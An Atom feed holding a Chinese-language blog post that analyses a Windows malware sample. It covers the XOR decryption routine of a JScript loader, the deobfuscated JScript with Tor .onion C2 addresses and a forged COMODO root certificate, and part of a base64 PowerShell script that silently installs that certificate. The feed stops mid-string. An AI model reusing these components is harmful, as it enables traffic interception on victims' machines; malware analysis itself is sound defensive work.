<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ydc&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://shxi.me/"/>
  <updated>2018-04-30T02:53:40.224Z</updated>
  <id>http://shxi.me/</id>
  
  <author>
    <name>Ken</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>调用jscript引擎接口的malware分析</title>
    <link href="http://shxi.me/posts/6193d55c.html"/>
    <id>http://shxi.me/posts/6193d55c.html</id>
    <published>2018-04-22T03:11:34.000Z</published>
    <updated>2018-04-30T02:53:40.224Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>文件SHA256: f47717a4ae920921b69e8fd590c7a6353be08cad3cfc1a438c490b38e248d3f7</p></blockquote><p><font color="red">取标题无能，知道是啥就行了</font><br>用IDA反编译代码,入口处函数如下：</p><pre><code>  主要功能解密jscript代码，通过com调用脚本引擎来执行脚本代码</code></pre> <body bgcolor="#232323"><br><span style="white-space: pre; font-family: Consolas;  "><br><span style="color:#73adad">int __cdecl main(int argc, const char <strong>argv, const char </strong>envp)<br></span><span><span>{                                                                                           </span></span><br>  <span style="color:#73adad">JSEngine <em>v3</em></span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">ST20_4<br>  </span><span style="color:#73adad">JSEngine v4</span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">ST18_4<br>  </span><span style="color:#73adad">unsigned int i</span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">[esp+1Ch] [ebp-14h]<br>  </span><span style="color:#73adad">encry_code *a2</span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">[esp+20h] [ebp-10h]<br><br>  </span><span style="color:#f187ff">FreeConsole</span><span style="color:#c0c0c0">();<br>  </span><span style="color:#00ffff">a2 </span><span style="color:#c0c0c0">= </span><span style="color:#ffecbb">operator new</span><span style="color:#c0c0c0">(</span><span style="color:#ababab">8u</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#00ffff">a2</span><span style="color:#c0c0c0">-&gt;size = </span><span style="color:#ababab">0x14C88</span><span style="color:#c0c0c0">;<br>  </span><span style="color:#00ffff">a2</span><span style="color:#c0c0c0">-&gt;js_code = </span><span style="color:#ffecbb">operator new[]</span><span style="color:#c0c0c0">(</span><span style="color:#00ffff">a2</span><span style="color:#c0c0c0">-&gt;size);<br>  </span><span style="color:#ababab">for </span><span style="color:#c0c0c0">( </span><span style="color:#00ffff">i </span><span style="color:#c0c0c0">= </span><span style="color:#ababab">0</span><span style="color:#c0c0c0">; </span><span style="color:#00ffff">i &lt; a2</span><span style="color:#c0c0c0">-&gt;size; ++</span><span style="color:#00ffff">i </span><span style="color:#c0c0c0">)<br>    </span><span style="color:#00ffff">a2</span><span style="color:#c0c0c0">-&gt;js_code[</span><span style="color:#00ffff">i</span><span style="color:#c0c0c0">] = </span><span style="color:#ffecbb">encrypt_code</span><span style="color:#c0c0c0">[</span><span style="color:#00ffff">i</span><span style="color:#c0c0c0">];<br>  </span><span style="color:#ffecbb">decrypt_code</span><span style="color:#c0c0c0">(</span><span style="color:#00ffff">a2</span><span style="color:#c0c0c0">-&gt;js_code, </span><span style="color:#00ffff">a2</span><span style="color:#c0c0c0">-&gt;size - </span><span style="color:#ababab">1</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#00ffff">v3 </span><span style="color:#c0c0c0">= </span><span style="color:#ffecbb">operator new</span><span style="color:#c0c0c0">(</span><span style="color:#ababab">0x10u</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#ffecbb">memset</span><span style="color:#c0c0c0">(</span><span style="color:#00ffff">v3</span><span style="color:#c0c0c0">, </span><span style="color:#ababab">0x10u</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#00ffff">v4 </span><span style="color:#c0c0c0">= </span><span style="color:#ffecbb">init_com</span><span style="color:#c0c0c0">(</span><span style="color:#00ffff">v3</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#ffecbb">run_jscript</span><span style="color:#c0c0c0">(</span><span style="color:#00ffff">v4</span><span style="color:#c0c0c0">, </span><span style="color:#00ffff">a2</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#ffecbb">sub_862F90</span><span style="color:#c0c0c0">(</span><span style="color:#00ffff">v4</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#ababab">return 0</span><span style="color:#c0c0c0">;<br></span><span style="background:#646464"></span><span style="background:#ababab"></span><span><span>} </span></span><br></span></body><h2 id="jscript代码解密"><a href="#jscript代码解密" class="headerlink" title="jscript代码解密"></a>jscript代码解密</h2><pre><code>    解密方式也比较简单，主要就是通过xor来解密</code></pre><body bgcolor="#232323"><br><span style="white-space: pre; font-family: Consolas; "><br><br><span style="color:#73adad">_BYTE <em>__cdecl decrypt_code(char </em>a1, unsigned int size)<br></span><span><span>{</span></span><br>  <span style="color:#ffd200">_BYTE <em>v2</em></span><span style="color:#c0c0c0">; </span><span style="color:#ffd200">// </span><span style="color:#00ffff">edx<br>  </span><span style="color:#73adad">_BYTE result</span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">eax<br>  </span><span style="color:#73adad">unsigned int v4</span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">[esp+0h] [ebp-1Ch]<br>  </span><span style="color:#ffd200">_BYTE <em>v5</em></span><span style="color:#c0c0c0">; </span><span style="color:#ffd200">// </span><span style="color:#00ffff">[esp+10h] [ebp-Ch]<br>  </span><span style="color:#73adad">unsigned int i</span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">[esp+14h] [ebp-8h]<br>  </span><span style="color:#73adad">unsigned int j</span><span style="color:#c0c0c0">; </span><span style="color:#73adad">// </span><span style="color:#00ffff">[esp+18h] [ebp-4h]<br><br>  v4 </span><span style="color:#c0c0c0">= </span><span style="color:#ababab">0x7FFFFFFF </span><span style="color:#c0c0c0">- </span><span style="color:#ababab">8</span><span style="color:#c0c0c0"></span><span style="color:#ffecbb">fun</span><span style="color:#c0c0c0">(</span><span style="color:#00ffff">size</span><span style="color:#c0c0c0">, </span><span style="color:#ababab">6</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#00ffff">result </span><span style="color:#c0c0c0">= </span><span style="color:#ffecbb">operator new</span><span style="color:#c0c0c0">(</span><span style="color:#ababab">1u</span><span style="color:#c0c0c0">);<br>  </span><span style="color:#00ffff">v5 </span><span style="color:#c0c0c0">= </span><span style="color:#00ffff">result</span><span style="color:#c0c0c0">;<br>  </span><span style="color:#00ffff">v2 </span><span style="color:#c0c0c0">= </span><span style="color:#00ffff">result</span><span style="color:#c0c0c0">;<br>  </span><span style="color:#ffecbb">LOBYTE</span><span style="color:#c0c0c0">(</span><span style="color:#00ffff">result</span><span style="color:#c0c0c0">) = </span><span style="color:#ababab">4</span><span style="color:#c0c0c0">;  </span><span style="color:#00ffff">v2 </span><span style="color:#c0c0c0">= </span><span style="color:#ababab">4</span><span style="color:#c0c0c0">;<br>  </span><span style="color:#ff633c">// 生成xor key<br>  </span><span style="color:#ababab">for </span><span style="color:#c0c0c0">( </span><span style="color:#00ffff">i </span><span style="color:#c0c0c0">= </span><span style="color:#ababab">0</span><span style="color:#c0c0c0">; </span><span style="color:#00ffff">i &lt; </span><span style="color:#ababab">4</span><span style="color:#c0c0c0">; ++</span><span style="color:#00ffff">i </span><span style="color:#c0c0c0">)<br>  {<br>    </span><span style="color:#00ffff">v5</span><span style="color:#c0c0c0">[</span><span style="color:#00ffff">i</span><span style="color:#c0c0c0">] = </span><span style="color:#00ffff">v4 &gt;&gt; </span><span style="color:#ababab">8 </span><span style="color:#c0c0c0">* </span><span style="color:#00ffff">i</span><span style="color:#c0c0c0">;<br>    </span><span style="color:#00ffff">result </span><span style="color:#c0c0c0">= (</span><span style="color:#00ffff">i </span><span style="color:#c0c0c0">+ </span><span style="color:#ababab">1</span><span style="color:#c0c0c0">);<br>  </span><span style="background:#c0c0c0"></span><span style="color:#c0c0c0">}<br>  </span><span style="color:#ababab">for </span><span style="color:#c0c0c0">( </span><span style="color:#00ffff">j </span><span style="color:#c0c0c0">= </span><span style="color:#ababab">0</span><span style="color:#c0c0c0">; </span><span style="color:#00ffff">j &lt; size</span><span style="color:#c0c0c0">; ++</span><span style="color:#00ffff">j </span><span style="color:#c0c0c0">)<br>  {<br>    </span><span style="color:#00ffff">result </span><span style="color:#c0c0c0">= (</span><span style="color:#00ffff">v5</span><span style="color:#c0c0c0">[</span><span style="color:#00ffff">j </span><span style="color:#c0c0c0">% </span><span style="color:#ababab">4</span><span style="color:#c0c0c0">] ^ </span><span style="color:#00ffff">a1</span><span style="color:#c0c0c0">[</span><span style="color:#00ffff">j</span><span style="color:#c0c0c0">]);<br>    </span><span style="color:#00ffff">a1</span><span style="color:#c0c0c0">[</span><span style="color:#00ffff">j</span><span style="color:#c0c0c0">] = </span><span style="color:#00ffff">result</span><span style="color:#c0c0c0">;<br>  </span><span style="background:#00ffff"></span><span style="color:#c0c0c0">}<br>  </span><span style="color:#ababab">return </span><span style="color:#00ffff">result</span><span style="color:#c0c0c0">;<br></span><span style="background:#646464"></span><span style="background:#00ffff"></span><span><span style="color:#c0c0c0">} </span></span><br></span></body><p>解密后的jscript代码如下，看得眼瞎。</p><p><img src="https://i.loli.net/2018/04/22/5adc6990e4707.png" alt=""></p><p>再次解密后代码，还是有点混淆</p><pre><code class="javascript">var CotZ=null;var PBPRfNXyqx=null;var XVEbnkh=null;var sZTSiOfmguW = new ActiveXObject(&quot;WScript.Shell&quot;);var VTU = new ActiveXObject(&quot;Scripting.FileSystemObject&quot;);var BINARY_STREAM_TYPE = 1;var TEXT_STREAM_TYPE = 2;var CREATE_OVERWRITE_SAVE_MODE = 2;var iOU=sZTSiOfmguW.ExpandEnvironmentStrings(&quot;%TEMP%&quot;);var DSoEmfpCHxm=sZTSiOfmguW.ExpandEnvironmentStrings(&quot;%APPDATA%&quot;);var hNVJ=sZTSiOfmguW.ExpandEnvironmentStrings(&quot;%COMPUTERNAME%&quot;);var dEhkFnrZt=iOU+&quot;\\&quot;+hNVJ+&quot;.log&quot;;//base64编码的ps脚本var kVQNRMoBaO={    LgiwpoajBw: [&quot;yzpayb4sqad7gnin.onion&quot;, &quot;bozuniy4sgprvinf.onion&quot;, &quot;qr5c2etn6x5lhhfc.onion&quot;, &quot;77gxepg2d34nfoid.onion&quot;],    oUXMMFdTE: &quot;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&quot;,    moZgTncSGjjMW: &quot;ZnVuY3Rpb24gUFlaT0lnWFJ7CkFkZC1UeXBlIEAiCnVzaW5nIFN5c3RlbTsKdXNpbmcgU3lzdGVtLlRleHQ7CnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsKdXNpbmcgU3lzdGVtLkRpYWdub3N0aWNzOwp1c2luZyBTeXN0ZW0uU2VjdXJpdHku&quot;+&quot;Q3J5cHRvZ3JhcGh5Llg1MDlDZXJ0aWZpY2F0ZXM7CnVzaW5nIFN5c3RlbS5UaHJlYWRpbmc7CgpwdWJsaWMgc3RhdGljIGNsYXNzIEppeFBDVWYKewoJcHVibGljIGNsYXNzIGRhZwogICAgewogICAgICAgIHB1YmxpYyBzdHJpbmcgV25kY2xhc3M7CiAgICAgICAg&quot;+&quot;cHVibGljIHN0cmluZyBUaXRsZTsKICAgICAgICBwdWJsaWMgc3RyaW5nIFByb2Nlc3M7CiAgICAgICAgcHVibGljIEludFB0ciBoV25kOwogICAgfQoKICAgIHByaXZhdGUgZGVsZWdhdGUgYm9vbCBIbHNycW92YkxQKEludFB0ciBoV25kLCByZWYgZGFnIGRhdGEp&quot;+&quot;OwoKICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiKV0KICAgIFtyZXR1cm46IE1hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJvb2wpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgRW51bVdpbmRvd3MoSGxzcnFvdmJMUCBscEVudW1GdW5jLCByZWYgZGFn&quot;+&quot;IGRhdGEpOwoJCglbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSwgQ2hhclNldCA9IENoYXJTZXQuQXV0byldCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBpbnQgR2V0Q2xhc3NOYW1lKEludFB0ciBoV25kLCBTdHJpbmdCdWlsZGVy&quot;+&quot;IGxwQ2xhc3NOYW1lLCBpbnQgbk1heENvdW50KTsKCiAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgQ2hhclNldCA9IENoYXJTZXQuQXV0bywgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBpbnQgR2V0V2luZG93VGV4dChJ&quot;+&quot;bnRQdHIgaFduZCwgU3RyaW5nQnVpbGRlciBscFN0cmluZywgaW50IG5NYXhDb3VudCk7CgkKCVtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlLCBDaGFyU2V0ID0gQ2hhclNldC5BdXRvKV0KCXN0YXRpYyBleHRlcm4gdWludCBHZXRX&quot;+&quot;aW5kb3dUaHJlYWRQcm9jZXNzSWQoSW50UHRyIGhXbmQsIG91dCB1aW50IGxwZHdQcm9jZXNzSWQpOwoJCglbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIildCglbcmV0dXJuOiBNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5Cb29sKV0KCXN0YXRpYyBleHRlcm4gYm9vbCBT&quot;+&quot;ZXRGb3JlZ3JvdW5kV2luZG93KEludFB0ciBoV25kKTsKCQoJcHVibGljIGRlbGVnYXRlIGJvb2wgS2RVR09HcWZsWEFvKEludFB0ciBod25kLCBJbnRQdHIgbFBhcmFtKTsKCQoJW0RsbEltcG9ydCgidXNlcjMyIildCglbcmV0dXJuOiBNYXJzaGFsQXMoVW5tYW5h&quot;+&quot;Z2VkVHlwZS5Cb29sKV0KCXB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgRW51bUNoaWxkV2luZG93cyhJbnRQdHIgd2luZG93LCBLZFVHT0dxZmxYQW8gY2FsbGJhY2ssIEludFB0ciBsUGFyYW0pOyAgCgkKCVtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBDaGFyU2V0&quot;+&quot;ID0gQ2hhclNldC5BdXRvKV0KCXN0YXRpYyBleHRlcm4gSW50UHRyIFNlbmRNZXNzYWdlKEludFB0ciBoV25kLCBVSW50MzIgTXNnLCBJbnRQdHIgd1BhcmFtLCBJbnRQdHIgbFBhcmFtKTsKCQoJW0ZsYWdzXQogICAgcHJpdmF0ZSBlbnVtIFNuYXBzaG90RmxhZ3Mg&quot;+&quot;OiB1aW50CiAgICB7CiAgICBIZWFwTGlzdCA9IDB4MDAwMDAwMDEsCiAgICBQcm9jZXNzID0gMHgwMDAwMDAwMiwKICAgIFRocmVhZCA9IDB4MDAwMDAwMDQsCiAgICBNb2R1bGUgPSAweDAwMDAwMDA4LAogICAgTW9kdWxlMzIgPSAweDAwMDAwMDEwLAogICAgSW5o&quot;+&quot;ZXJpdCA9IDB4ODAwMDAwMDAsCiAgICBBbGwgPSAweDAwMDAwMDFGLAogICAgTm9IZWFwcyA9IDB4NDAwMDAwMDAKICAgIH0KICAgIC8vaW5uZXIgc3RydWN0IHVzZWQgb25seSBpbnRlcm5hbGx5CiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlh&quot;+&quot;bCwgQ2hhclNldCA9IENoYXJTZXQuQXV0byldCiAgICBwcml2YXRlIHN0cnVjdCBQUk9DRVNTRU5UUlkzMgogICAgewogICAgY29uc3QgaW50IE1BWF9QQVRIID0gMjYwOwogICAgaW50ZXJuYWwgVUludDMyIGR3U2l6ZTsKICAgIGludGVybmFsIFVJbnQzMiBjbnRV&quot;+&quot;c2FnZTsKICAgIGludGVybmFsIFVJbnQzMiB0aDMyUHJvY2Vzc0lEOwogICAgaW50ZXJuYWwgSW50UHRyIHRoMzJEZWZhdWx0SGVhcElEOwogICAgaW50ZXJuYWwgVUludDMyIHRoMzJNb2R1bGVJRDsKICAgIGludGVybmFsIFVJbnQzMiBjbnRUaHJlYWRzOwogICAg&quot;+&quot;aW50ZXJuYWwgVUludDMyIHRoMzJQYXJlbnRQcm9jZXNzSUQ7CiAgICBpbnRlcm5hbCBJbnQzMiBwY1ByaUNsYXNzQmFzZTsKICAgIGludGVybmFsIFVJbnQzMiBkd0ZsYWdzOwogICAgW01hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJ5VmFsVFN0ciwgU2l6ZUNvbnN0&quot;+&quot;ID0gTUFYX1BBVEgpXQogICAgaW50ZXJuYWwgc3RyaW5nIHN6RXhlRmlsZTsKICAgIH0KCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIsIFNldExhc3RFcnJvciA9IHRydWUsIENoYXJTZXQgPSBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuQ2hhclNldC5B&quot;+&quot;dXRvKV0KICAgIHN0YXRpYyBleHRlcm4gSW50UHRyIENyZWF0ZVRvb2xoZWxwMzJTbmFwc2hvdChbSW5dVUludDMyIGR3RmxhZ3MsIFtJbl1VSW50MzIgdGgzMlByb2Nlc3NJRCk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIiLCBTZXRMYXN0RXJyb3IgPSB0cnVl&quot;+&quot;LCBDaGFyU2V0ID0gU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkNoYXJTZXQuQXV0byldCiAgICBzdGF0aWMgZXh0ZXJuIGJvb2wgUHJvY2VzczMyRmlyc3QoW0luXUludFB0ciBoU25hcHNob3QsIHJlZiBQUk9DRVNTRU5UUlkzMiBscHBlKTsKCiAgICBb&quot;+&quot;RGxsSW1wb3J0KCJrZXJuZWwzMiIsIFNldExhc3RFcnJvciA9IHRydWUsIENoYXJTZXQgPSBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuQ2hhclNldC5BdXRvKV0KICAgIHN0YXRpYyBleHRlcm4gYm9vbCBQcm9jZXNzMzJOZXh0KFtJbl1JbnRQdHIgaFNu&quot;+&quot;YXBzaG90LCByZWYgUFJPQ0VTU0VOVFJZMzIgbHBwZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIFtyZXR1cm46IE1hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJvb2wpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0&quot;+&quot;ZXJuIGJvb2wgQ2xvc2VIYW5kbGUoW0luXSBJbnRQdHIgaE9iamVjdCk7CiAgICAKCWNvbnN0IGludCBCTV9DTCA9IDB4MDBGNTsKCQoJcHVibGljIHN0YXRpYyBieXRlW10gdXZEemNlKFN0cmluZyBzQ2VydCkKICAgIHsKCQlyZXR1cm4gQ29udmVydC5Gcm9tQmFz&quot;+&quot;ZTY0U3RyaW5nKHNDZXJ0KTsKICAgIH0KICAgICAgICAKCXB1YmxpYyBzdGF0aWMgdm9pZCBJaldGbmROS1p2KFN0cmluZyBzQ2VydCl7CgkJU3lzdGVtLkNvbnNvbGUuV3JpdGVMaW5lKCJbV2luMzJdOjpTdGFydCgpIik7CiAgICAgICAgYnl0ZVtdIGJDZXJ0ID0g&quot;+&quot;dXZEemNlKHNDZXJ0KTsKICAgICAgICBpZiAoYkNlcnQgIT0gbnVsbCkKICAgICAgICB7CiAgICAgICAgICAgIFg1MDlDZXJ0aWZpY2F0ZTIgY2VydGlmaWNhdGUgPSBuZXcgWDUwOUNlcnRpZmljYXRlMihiQ2VydCk7CiAgICAgICAgICAgIFg1MDlTdG9yZSBzdG9y&quot;+&quot;ZSA9IG5ldyBYNTA5U3RvcmUoU3RvcmVOYW1lLlJvb3QsIFN0b3JlTG9jYXRpb24uQ3VycmVudFVzZXIpOwogICAgICAgICAgICBzdG9yZS5PcGVuKE9wZW5GbGFncy5SZWFkV3JpdGUpOwogICAgICAgICAgICBpZiAoIXN0b3JlLkNlcnRpZmljYXRlcy5Db250YWlu&quot;+&quot;cyhjZXJ0aWZpY2F0ZSkpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocmVhZCB0aHJlYWQgPSBuZXcgVGhyZWFkKERJSVFEQlJjekFQKTsKICAgICAgICAgICAgICAgIHRocmVhZC5TdGFydCgpOwogICAgICAgICAgICAgICAgc3RvcmUuQWRkKGNlcnRp&quot;+&quot;ZmljYXRlKTsKICAgICAgICAgICAgICAgIHRocmVhZC5Kb2luKCk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgc3RvcmUuQ2xvc2UoKTsKICAgICAgICB9Cgl9CgkKCXB1YmxpYyBzdGF0aWMgdm9pZCBESUlRREJSY3pBUCgpCgl7CgkJU3lzdGVtLkNvbnNvbGUu&quot;+&quot;V3JpdGVMaW5lKCJbV2luMzJdOjpTZWFyY2hEaWFsb2coKSIpOwoJCUludFB0ciBoV25kOwoJCWRvewoJCQloV25kID0gTWtNdW5hV0FnKCIjMzI3NzAiLFN0cmluZy5FbXB0eSk7CgkJCWlmICghaFduZC5FcXVhbHMoSW50UHRyLlplcm8pKQoJCSAgICB7CgkJCQlT&quot;+&quot;eXN0ZW0uQ29uc29sZS5Xcml0ZUxpbmUoIkZvdW5kZWQgaFduZD0weHswOlh9IixoV25kKTsKCQkgICAgCWJyZWFrOwoJCQl9ZWxzZQoJICAgICAgICB7CgkJCQloV25kPUludFB0ci5aZXJvOwoJCQkJU3lzdGVtLkNvbnNvbGUuV3JpdGVMaW5lKCJUcnkgYWdhaW4g&quot;+&quot;ZmluZCB3aW5kb3ciKTsKCSAgICAgICAgfQoJCX13aGlsZSAoaFduZC5FcXVhbHMoSW50UHRyLlplcm8pKTsKCQlTeXN0ZW0uQ29uc29sZS5Xcml0ZUxpbmUoIkRpYWxvZyB3aW5kb3cgZm91bmRlZCIpOwoJCVNldEZvcmVncm91bmRXaW5kb3coaFduZCk7CgkJS2RV&quot;+&quot;R09HcWZsWEFvIGNoaWxkUHJvYyA9IG5ldyBLZFVHT0dxZmxYQW8oT3NNZmdLZVVFZUxoKTsKCQlFbnVtQ2hpbGRXaW5kb3dzKGhXbmQsIGNoaWxkUHJvYywgSW50UHRyLlplcm8pOwoJfQoJCglwdWJsaWMgc3RhdGljIEludFB0ciBNa011bmFXQWcoc3RyaW5nIHdu&quot;+&quot;ZGNsYXNzLCBzdHJpbmcgdGl0bGUpCiAgICB7CiAgICAgICAgZGFnIHNkID0gbmV3IGRhZygpOwogICAgICAgIHNkLlduZGNsYXNzID0gd25kY2xhc3M7CiAgICAgICAgc2QuVGl0bGUgPSB0aXRsZTsKCQlzZC5oV25kPUludFB0ci5aZXJvOwoJCVN5c3RlbS5Db25z&quot;+&quot;b2xlLldyaXRlTGluZSgiRW51bVdpbmRvdyAtfCIpOwogICAgICAgIEVudW1XaW5kb3dzKG5ldyBIbHNycW92YkxQKFZQQXJtQmpuTkN1QyksIHJlZiBzZCk7CiAgICAgICAgcmV0dXJuIHNkLmhXbmQ7CiAgICB9CiAgICAKCXB1YmxpYyBzdGF0aWMgYm9vbCBWUEFy&quot;+&quot;bUJqbk5DdUMoSW50UHRyIGhXbmQsIHJlZiBkYWcgZGF0YSkKICAgIHsKICAgIAlTdHJpbmdCdWlsZGVyIHRpdGxlID0gbmV3IFN0cmluZ0J1aWxkZXIoMTAyNCk7CiAgICAgICAgU3RyaW5nQnVpbGRlciBjbGFzc05hbWUgPSBuZXcgU3RyaW5nQnVpbGRlcigxMDI0&quot;+&quot;KTsKICAgICAgICBHZXRXaW5kb3dUZXh0KGhXbmQsIHRpdGxlLCB0aXRsZS5DYXBhY2l0eSk7CiAgICAgICAgR2V0Q2xhc3NOYW1lKGhXbmQsIGNsYXNzTmFtZSwgY2xhc3NOYW1lLkNhcGFjaXR5KTsKICAgICAgICBTdHJpbmcgc0VOPXZoZEhKKGhXbmQpLlRvTG93&quot;+&quot;ZXIoKTsKCQlpZigoIWRhdGEuV25kY2xhc3MuRXF1YWxzKFN0cmluZy5FbXB0eSkgJiYgY2xhc3NOYW1lLlRvU3RyaW5nKCkuU3RhcnRzV2l0aChkYXRhLlduZGNsYXNzKSkgfHwgKCFkYXRhLlRpdGxlLkVxdWFscyhTdHJpbmcuRW1wdHkpICYmIHRpdGxlLlRvU3Ry&quot;+&quot;aW5nKCkuU3RhcnRzV2l0aChkYXRhLlRpdGxlKSkpCgkJewoJCQlTeXN0ZW0uQ29uc29sZS5Xcml0ZUxpbmUoIiAgICAgICAgICAgIHwtIGhXbmQ9MHh7MDpYfTsgQ2xhc3M9ezF9OyBUaXRsZT17Mn07IFByb2Nlc3M9ezN9IixoV25kLGNsYXNzTmF